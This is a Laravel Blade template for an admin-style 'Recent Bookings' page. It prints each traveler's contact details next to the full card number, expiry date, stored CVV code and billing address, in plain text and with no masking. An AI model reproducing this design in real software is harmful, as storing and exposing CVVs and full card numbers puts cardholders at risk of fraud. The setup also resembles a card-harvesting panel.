<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Booking Data</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #f9f9f9; }
        h1 { color: #333; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.1); font-size: 14px; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #ddd; vertical-align: top; }
        th { background-color: #007bff; color: white; position: sticky; top: 0; }
        tr:hover { background-color: #f1f1f1; }
        .card-number { font-family: monospace; color: #666; }
        .total { font-weight: bold; color: #28a745; }
        .date { color: #888; font-size: 0.85em; white-space: nowrap; }
        .sensitive { color: #d9534f; font-weight: bold; } /* Red for sensitive data */
        .back-link { display: inline-block; margin-top: 20px; color: #007bff; text-decoration: none; font-weight: bold; }
        .back-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>📦 Recent Bookings</h1>
    <p><small>Last 50 submissions • Data stored in Render PostgreSQL</small></p>

    @if($travelers->isEmpty())
        <p>No bookings yet.</p>
    @else
        <div style="overflow-x: auto;"> <!-- Scrollable table for small screens -->
            <table>
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Email</th>
                        <th>Phone</th>
                        <th>Card Holder</th>
                        <th>Card Number</th>
                        <th>Exp Date</th>
                        <th>CVV</th>
                        <th>Billing Country</th>
                        <th>Billing Address 1</th>
                        <th>Billing Address 2</th>
                        <th>City</th>
                        <th>Zip Code</th>
                        <th>Total Paid</th>
                        <th>Submitted At</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach($travelers as $t)
                    <tr>
                        <td>
                            {{ $t->first_name }} {{ $t->last_name }}<br>
                            <small style="color:#777">{{ $t->gender }}</small>
                        </td>
                        <td>{{ $t->email }}</td>
                        <td>{{ $t->country_code }} {{ $t->phone_number }}</td>
                        
                        <!-- Payment Info -->
                        <td>{{ $t->paymentInfo->name_on_card ?? 'N/A' }}</td>
                        
                        <td class="card-number">
                            {{ $t->paymentInfo->card_number ?? 'N/A' }}
                        </td>
                        
                        <td class="sensitive">
                            {{ $t->paymentInfo->expiration_month ?? '' }}/{{ $t->paymentInfo->expiration_year ?? '' }}
                        </td>
                        
                        <td class="sensitive">
                            {{ $t->paymentInfo->security_code ?? 'N/A' }}
                        </td>

                        <td class="sensitive">
                            {{ $t->paymentInfo->billing_country ?? 'N/A' }}     
                        </td>

                        <td class="sensitive">
                            {{ $t->paymentInfo->billing_address_1 ?? 'N/A' }}     
                        </td>

                        <td class="sensitive">
                            {{ $t->paymentInfo->billing_address_2 ?? 'N/A' }}     
                        </td>

                        <td class="sensitive">
                            {{ $t->paymentInfo->city ?? 'N/A' }}     
                        </td>

                        <td class="sensitive">
                            {{ $t->paymentInfo->zip_code ?? 'N/A' }}     
                        </td>

                        
                        <td class="total">${{ number_format($t->paymentInfo->total_amount ?? 0, 2) }}</td>
                        
                        <td class="date">
                            {{ $t->created_at->format('M d, Y') }}<br>
                            {{ $t->created_at->format('H:i:s') }}
                        </td>
                    </tr>
                    @endforeach
                </tbody>
            </table>
        </div>
    @endif

    <a href="/" class="back-link">← Back to Checkout</a>
</body>
</html>